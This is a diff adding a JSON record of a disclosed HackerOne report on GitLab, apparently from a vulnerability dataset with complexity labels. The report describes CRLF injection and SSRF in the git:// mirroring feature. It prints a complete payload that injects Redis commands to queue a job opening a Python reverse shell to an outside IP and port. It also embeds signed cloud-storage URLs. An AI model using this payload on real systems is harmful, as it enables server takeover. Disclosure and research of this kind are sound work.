@@ -1,0 +1,53 @@
+{
+    "reported_to": "GitLab",
+    "reported_by": "chromium1337 ",
+    "title": "CRLF injection & SSRF in git:// protocal lead to arbitrary code execution",
+    "content": "\nSummary:\nThe implementation of git:// protocal in GitLab is vulnerable to CRLF injection and Server-Side Request Forgery. If the redis server is configured to listen on TCP socket (eg. port 6379), an attacker can abuse SSRF to manipulate redis server, injecting malicious payload into system_hook_push queue, which result in arbitrary code execution.\n<image_0>\nSteps To Reproduce:\nFollow GitLab Docs to set up a redis server listening on 127.0.0.1:6379\nSign in and create a project, go to project Settings -> Repository -> Mirroring repositories\nAdd a mirror repo, capture the POST request using BurpSuite or Fiddler or whatever you like, and modify the post param project[remote_mirrors_attributes][0][url] to:\nCode 635 Bytes\n1git://127.0.0.1:6379/\n2 multi\n3 sadd resque:gitlab:queues system_hook_push\n4 lpush resque:gitlab:queue:system_hook_push \"{\\\"class\\\":\\\"GitlabShellWorker\\\",\\\"args\\\":[\\\"class_eval\\\",\\\"open(\\'|/usr/bin/python3 -c \\\\\\\\\\'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\\\\\"118.89.198.146\\\\\\\",8000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\\\\\"/bin/sh\\\\\\\",\\\\\\\"-i\\\\\\\"]);\\\\\\\\\\'\\').read\\\"],\\\"retry\\\":3,\\\"queue\\\":\\\"system_hook_push\\\",\\\"jid\\\":\\\"ad52abc5641173e217eb2e52\\\",\\\"created_at\\\":1513714403.8122594,\\\"enqueued_at\\\":1513714403.8129568}\"\n5 exec\n6/bbbbb/ccccc\n(Thanks to @jobert 's payload again!)\nMake a POST request to /{username}/{project name}/mirror/update_now?sync_remote=true to trigger the mirror action\nAttacker will receive a reverse shell on 118.89.198.146 port 8000\n<image_1>\nImpact\nSame as https://hackerone.com/reports/299473:\nAn attacker can execute arbitrary system commands on the server, which exposes access to all git repositories, database, and potentially other secrets that may be used to escalate this further.\n\n",
+    "severity": [
+        8.5,
+        null
+    ],
+    "bounty": null,
+    "weaknesses": [
+        "Server-Side Request Forgery (SSRF)"
+    ],
+    "screenshots": {
+        "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/375/843/ff9414fa50e54c353c4983810a8ac76a27651d38/2.gif?response-content-disposition=attachment%3B%20filename%3D%222.gif%22%3B%20filename%2A%3DUTF-8%27%272.gif&response-content-type=image%2Fgif&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2Y6G2NUU%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T220252Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELT%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDJuqn9kdtu2Unz0Z7wyEsUibPx2F7drbSBOWFTL45NiAIge4cG2%2B%2FCYBRquViHAf1ya0yjWFza%2FbVJYvKGVp9AMAMqsgUIHRADGgwwMTM2MTkyNzQ4NDkiDAOQ94LYZ1Z2I%2FbT3iqPBZNoZ5Qv%2B6zwPjuiNOg%2B3bkXtXWKvZ3ms0qFE07q2iHxcWQUOVHSVmtoLfBGgOAVJ4UTChA9cehYQTyUrcfugsEnTnmmmuHNqhQoRlOkaDd0JdKKBQoddVioIXbRmIS7NYUOBGCRCAhg8SvRoMVwCSoCexVF4X%2FXHlEJphH82fzlJSBuDti8rAXeTRTqmkGp0oU9JQQHQL8xsJidlEKyPoRNW8xaNVlX%2BwN21KRoEDqlCIkHCEQGrt4gkgGLCJfDxrgr5f8FRA0N1VjtnFiKyr5v%2BE0pysS%2BJVmEffnsy8e3jNksHIwvaTS3DIRCAq%2Fg%2B6bV3m79B565y%2Fg9CgKPwYZ9UEu07JTnFpwqmwEQQEYzcviuU5wqHXFWf5oQLnqVHsKFX4s1QPEll74yw%2BzzmLRbWP7MriOVAZ0mr%2FeFn8xyEp0NEi1ry8biDtDGNl724FHGegwg81ar32RlncV%2B44raHdyYrFCgQS%2Fj86OVhe%2F2GOfWG%2BN14Dn1PRl6oOgjnqbd6cBPVglZA0S3zJ9TthJdqnxPIRGaU3dwuJpVmL%2Bvvtuid4NX%2FG6en7plOAX5IfYRvH84XWqY%2F%2FmcVkIQ6ViMLmWJuXvLuarqZzBldX9Vp8f4VLzJtVvxHCqUs7RBhN3PdDi0L0itzE85dpR2LDtXK2S%2F4bxtmPpzXG4jULH61Cgr277FE2XpOQDqpXrqTGibfanLYklNBliety5RMhusoGfSLVsY9%2F1vFj6Q58f4gR6TNeAwsUBeu3A%2B25yZORFE2NLz9Ws%2B9Gfbw%2FhL3%2FxJjIMrV10Sk6M8JdyZqfTI85Kq%2FlJc0tjmP4MhmsylrhI5VbE03gXJatRO%2BwZcivdG3BxDMOWcv78LZyfhvRgwgpGMvwY6sQFgw%2BWnsIdVBUuwXZ4atbgtCjB%2BL%2FYDSWwVvNsmQgwigXDKIrA4%2FXuCcmT9Ja%2Fo2btzVyeKU2W3BtD1lVfd5sQXH76dj5ggdRuKpmKNPFGfpZyOxcvaA%2FbDdvbGQI0IQ2XHcfbuXi3lC0dQifpqefiLpk27Z17BEKw8OJHiMDLBhiNp26sIBDCT8URGtSIN4%2B6yuL%2BtaKnxIxjuyPzjAR8okSQUl94hX9Y6h3D3BO6iRPg%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=2bb9cc09612b7c827265a52f8311007446289dae54302ba279c95f5f26841e1f",
+        "image_1": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/375/845/11ff78f18d7a673322f22ec289b1206e583550d0/1.gif?response-content-disposition=attachment%3B%20filename%3D%221.gif%22%3B%20filename%2A%3DUTF-8%27%271.gif&response-content-type=image%2Fgif&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2Y6G2NUU%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T220252Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELT%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDJuqn9kdtu2Unz0Z7wyEsUibPx2F7drbSBOWFTL45NiAIge4cG2%2B%2FCYBRquViHAf1ya0yjWFza%2FbVJYvKGVp9AMAMqsgUIHRADGgwwMTM2MTkyNzQ4NDkiDAOQ94LYZ1Z2I%2FbT3iqPBZNoZ5Qv%2B6zwPjuiNOg%2B3bkXtXWKvZ3ms0qFE07q2iHxcWQUOVHSVmtoLfBGgOAVJ4UTChA9cehYQTyUrcfugsEnTnmmmuHNqhQoRlOkaDd0JdKKBQoddVioIXbRmIS7NYUOBGCRCAhg8SvRoMVwCSoCexVF4X%2FXHlEJphH82fzlJSBuDti8rAXeTRTqmkGp0oU9JQQHQL8xsJidlEKyPoRNW8xaNVlX%2BwN21KRoEDqlCIkHCEQGrt4gkgGLCJfDxrgr5f8FRA0N1VjtnFiKyr5v%2BE0pysS%2BJVmEffnsy8e3jNksHIwvaTS3DIRCAq%2Fg%2B6bV3m79B565y%2Fg9CgKPwYZ9UEu07JTnFpwqmwEQQEYzcviuU5wqHXFWf5oQLnqVHsKFX4s1QPEll74yw%2BzzmLRbWP7MriOVAZ0mr%2FeFn8xyEp0NEi1ry8biDtDGNl724FHGegwg81ar32RlncV%2B44raHdyYrFCgQS%2Fj86OVhe%2F2GOfWG%2BN14Dn1PRl6oOgjnqbd6cBPVglZA0S3zJ9TthJdqnxPIRGaU3dwuJpVmL%2Bvvtuid4NX%2FG6en7plOAX5IfYRvH84XWqY%2F%2FmcVkIQ6ViMLmWJuXvLuarqZzBldX9Vp8f4VLzJtVvxHCqUs7RBhN3PdDi0L0itzE85dpR2LDtXK2S%2F4bxtmPpzXG4jULH61Cgr277FE2XpOQDqpXrqTGibfanLYklNBliety5RMhusoGfSLVsY9%2F1vFj6Q58f4gR6TNeAwsUBeu3A%2B25yZORFE2NLz9Ws%2B9Gfbw%2FhL3%2FxJjIMrV10Sk6M8JdyZqfTI85Kq%2FlJc0tjmP4MhmsylrhI5VbE03gXJatRO%2BwZcivdG3BxDMOWcv78LZyfhvRgwgpGMvwY6sQFgw%2BWnsIdVBUuwXZ4atbgtCjB%2BL%2FYDSWwVvNsmQgwigXDKIrA4%2FXuCcmT9Ja%2Fo2btzVyeKU2W3BtD1lVfd5sQXH76dj5ggdRuKpmKNPFGfpZyOxcvaA%2FbDdvbGQI0IQ2XHcfbuXi3lC0dQifpqefiLpk27Z17BEKw8OJHiMDLBhiNp26sIBDCT8URGtSIN4%2B6yuL%2BtaKnxIxjuyPzjAR8okSQUl94hX9Y6h3D3BO6iRPg%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=dc7eb32f8cc1eacd7b3142a28a4f866ad48beb614b9f42f0fb0050c9ea93efc6"
+    },
+    "disclosed_date": 1606165620,
+    "report_url": "https://hackerone.com/reports/441090",
+    "is_multi_component": true,
+    "complexity": "HIGH",
+    "novelty": "MEDIUM",
+    "vuln_category": "WEB_APP",
+    "steps": [
+        [
+            1,
+            "Set up a Redis server listening on 127.0.0.1:6379."
+        ],
+        [
+            2,
+            "Sign in to GitLab, create a project, and go to project Settings -> Repository -> Mirroring repositories."
+        ],
+        [
+            3,
+            "Add a mirror repository and capture the POST request. Modify the 'project[remote_mirrors_attributes][0][url]' parameter to inject a malicious git:// URL with CRLF and SSRF payload."
+        ],
+        [
+            4,
+            "Make a POST request to '/{username}/{project name}/mirror/update_now?sync_remote=true' to trigger the mirror action."
+        ],
+        [
+            5,
+            "Attacker receives a reverse shell on the specified IP and port."
+        ]
+    ],
+    "vuln_description": "The GitLab implementation of the git:// protocol is vulnerable to CRLF injection and Server-Side Request Forgery (SSRF). By manipulating the Redis server through SSRF, an attacker can inject malicious payloads into the system_hook_push queue, leading to arbitrary code execution.",
+    "reason": "This vulnerability involves multiple complex components: CRLF injection, SSRF, Redis manipulation, and payload crafting. The attacker must understand how these components interact subtly to achieve code execution. The attack also requires manipulating the application state through Redis and crafting a non-obvious payload to trigger the vulnerability.",
+    "new_complexity": "HIGH",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": "299473"
+}
